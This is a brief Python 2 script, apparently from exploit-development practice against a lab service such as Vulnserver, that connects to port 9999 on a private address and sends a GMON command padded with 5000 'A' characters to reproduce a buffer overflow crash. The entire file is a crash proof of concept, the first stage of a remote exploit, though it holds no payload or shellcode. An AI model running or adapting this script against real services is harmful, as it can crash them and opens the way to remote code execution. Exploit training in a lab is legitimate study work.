#!/usr/bin/python

import socket
import struct

ip_addr = '192.168.199.130'
port = 9999

print "GMON Command - Verify Crash\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    # Verify we can recreate the crash
    buffer = "GMON /.:/" + 'A'*5000
    
    bytes_sent = s.send(buffer)
    print "Sent %s bytes" % bytes_sent

finally:
    s.close()
